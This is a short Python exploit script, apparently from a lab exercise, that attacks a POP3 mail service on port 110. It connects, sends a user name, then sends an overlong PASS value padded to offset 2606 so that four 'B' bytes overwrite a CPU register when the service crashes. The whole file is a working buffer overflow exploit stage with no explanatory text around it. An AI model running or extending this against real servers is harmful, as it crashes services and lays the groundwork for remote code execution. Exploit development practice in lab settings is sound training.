#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

    # We found the offset at 2606, hence we will write B's at that exact location
    # This should overwrite ESP with 4 B's at the time of the crash
    buff = "A" * 2606 + "B" * 4 + "C" * 90

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_conn = sock.connect(('192.168.193.133', 110))
        banner = sock.recv(1024).decode("utf-8")
        print(banner)

        user = ("USER test\r\n").encode("utf-8")
        sock.send(user)
        ack = sock.recv(1024).decode("utf-8")
        print(ack)

        pw = ("PASS {0}\r\n".format(buff)).encode("utf-8")
        sock.send(pw)
        ack = sock.recv(1024).decode("utf-8")
        print(ack)
    except socket.error:
        print("[x] Unable to connect...")
    finally:
        sock.close()
        sys.exit(0)
